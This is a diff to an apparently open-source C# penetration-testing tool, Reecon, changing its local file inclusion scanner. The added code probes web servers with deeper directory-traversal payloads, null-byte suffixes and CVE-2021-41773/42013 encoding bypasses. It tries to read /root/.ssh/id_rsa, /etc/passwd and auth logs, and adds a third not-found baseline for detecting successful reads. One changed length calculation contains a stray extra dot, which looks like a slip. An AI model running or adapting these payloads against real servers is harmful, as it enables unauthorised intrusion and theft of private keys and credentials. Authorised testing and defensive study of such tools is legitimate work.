@@ -13,6 +13,7 @@ namespace Reecon
         private static string baseLocation = "";
         private static int notFoundLength = 0;
         private static int notFoundLength2 = 0;
+        private static int notFoundLength3 = 0;
         private static int bypassMethod = -1;
 
         public static void Scan(string[] args)
@@ -48,6 +49,7 @@ namespace Reecon
                     // General web checks
                     "/var/www/html/.htpasswd",
                     "/var/www/html/forum/.htpasswd",
+                    "/var/www/",
 
                     // Wordpress
                     "/var/www/html/wp-config.php",
@@ -88,7 +90,8 @@ namespace Reecon
                 // Do some logging checks
                 List<string> linux_logs = new()
                 {
-                    "/var/log/vsftpd.log"
+                    "/var/log/vsftpd.log", // FTP
+                    "/var/log/auth.log" // SSH 
                 };
                 DoLFI(linux_logs);
 
@@ -122,7 +125,8 @@ namespace Reecon
                     "/etc/ssh/ssh_config",
                     "/etc/ssh/sshd_config",
                     "/root/.ssh/id_rsa",
-                    "/root/.ssh/authorized_keys"
+                    "/root/.ssh/authorized_keys",
+                    "/var/log/auth.log"
                 };
                 DoLFI(linux_ssh);
 
@@ -164,7 +168,8 @@ namespace Reecon
 
             // Run checks to determine what an invalid path returns
             Console.WriteLine("Determining invalid path results...");
-            // NFL1
+            
+            // NFL1 - A regular invalid path
             string result = Web.GetHTTPInfo(baseURL + "Reelix").PageText;
             notFoundLength = result.Length; // Check for cases where the page text contains the URL?
             // Some not-found pages can be blank
@@ -172,16 +177,25 @@ namespace Reecon
             {
                 notFoundLength = 0;
             }
-            Console.WriteLine("Invalid Path 1/2 Length: " + notFoundLength);
+            Console.WriteLine("Invalid Path 1/3 Length: " + notFoundLength);
 
-            // NFL2
+            // NFL2 - An invalid path with 2 dots
             result = Web.GetHTTPInfo(baseURL + "Ree..lix").PageText;
             notFoundLength2 = result.Length;
             if (notFoundLength2 < 0)
             {
                 notFoundLength2 = 0;
             }
-            Console.WriteLine("Invalid Path 2/2 Length: " + notFoundLength2);
+            Console.WriteLine("Invalid Path 2/3 Length: " + notFoundLength2);
+
+            // NFL3 - An invalid path, but the error message contains the path itself
+            result = Web.GetHTTPInfo(baseURL + "/some/file/name.txt").PageText;
+            notFoundLength3 = result.Replace("/some/file/name.txt", "").Length;
+            if (notFoundLength3 < 0)
+            {
+                notFoundLength3 = 0;
+            }
+            Console.WriteLine("Invalid Path 3/3 Length: " + notFoundLength3);
         }
 
         private static General.OS GetOS()
@@ -191,6 +205,7 @@ namespace Reecon
             List<string> linuxChecks = new()
             {
                 "/etc/./passwd", // The . is intentional - It's a mini firewall bypass
+                "/etc/passwd",
                 "/etc/resolv.conf",
                 "/var/www/index.php",
                 "/var/www/html/index.php",
@@ -247,10 +262,11 @@ namespace Reecon
             // ../ bypass: %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
             // More: https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
+            // Note: Paths can sometimes be quite deep - Use a base of 7 folders up
             // Bypass Method 0: {PATH}
-            // Bypass Method 1: /../../../../..{PATH}
-            // Bypass Method 2: /../../../../..{PATH}%00
-            // Bypass Method 3: /../../../../..{PATH}%00.ext
+            // Bypass Method 1: /../../../../../..{PATH}
+            // Bypass Method 2: /../../../../../..{PATH}%00
+            // Bypass Method 3: /../../../../../..{PATH}%00.ext
             // Bypass Method 4: CVE-2021-41773 - .%2e/.%2e/.%2e/.%2e/.%2e{PATH}
             // Bypass Method 5: CVE-2021-42013 - %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{PATH}
             // Bypass Method 6: Non-Recursive Strip - /../.../...//../.../...//../.../...//../.../...//../.../.../{PATH}
@@ -275,15 +291,15 @@ namespace Reecon
                         bypassMethod = 0;
                     }
                 }
-                // Method 1: /../../../../..{PATH}
+                // Method 1: /../../../../../..{PATH}
                 if (bypassMethod == -1)
                 {
-                    Console.WriteLine($"Testing: /../../../../..{{PATH}} with {check}");
+                    Console.WriteLine($"Testing: /../../../../../..{{PATH}} with {check}");
                 }
                 if (bypassMethod == -1 || bypassMethod == 1)
                 {
-                    string toCheck = baseURL + "/../../../../.." + check;
-                    int bypassLength = "/../../../../..".Length;
+                    string toCheck = baseURL + "/../../../../../.." + check;
+                    int bypassLength = "/../../../../../..".Length;
                     bool isLFI = TestLFI(toCheck, check, bypassLength);
                     if (isLFI && bypassMethod == -1)
                     {
@@ -292,15 +308,15 @@ namespace Reecon
                     }
                 }
 
-                // Method 2: /../../../../..{PATH}%00
+                // Method 2: /../../../../../..{PATH}%00
                 if (bypassMethod == -1)
                 {
-                    Console.WriteLine($"Testing: /../../../../..{{PATH}}%00 with {check}");
+                    Console.WriteLine($"Testing: /../../../../../..{{PATH}}%00 with {check}");
                 }
                 if (bypassMethod == -1 || bypassMethod == 2)
                 {
-                    string toCheck = baseURL + "/../../../../.." + check + "%00";
-                    int bypassLength = "/../../../../..".Length + "%00".Length;
+                    string toCheck = baseURL + "/../../../../../.." + check + "%00";
+                    int bypassLength = "/../../../../../...".Length + "%00".Length;
                     bool isLFI = TestLFI(toCheck, check, bypassLength);
                     if (isLFI && bypassMethod == -1)
                     {
@@ -410,11 +426,16 @@ namespace Reecon
                 }
                 string result = requestResult.PageText;
                 int resultLength = result.Length;
-                if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + bypassLength)
+                if (
+                    // NFL 1
+                    resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + bypassLength)
+                    // NFL 2
                     && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length + bypassLength)
+                    // NFL 3
+                    && (resultLength - (check.Length + bypassLength) != notFoundLength3)
                     && !result.Contains("failed to open stream")
                     && !result.Contains("Attack detected") // Firewall
-                    )
+                   )
                 {
                     Console.WriteLine("- " + fullPath + " (Len: " + resultLength + ")");
                     ParseUsefulEntries(check, result);
@@ -432,7 +453,7 @@ namespace Reecon
 
         private static void ParseUsefulEntries(string check, string pageText)
         {
-            if (check == "/etc/./passwd")
+            if (check == "/etc/passwd" || check == "/etc/./passwd")
             {
                 if (pageText.Contains("root:x:0:0:root:/root"))
                 {
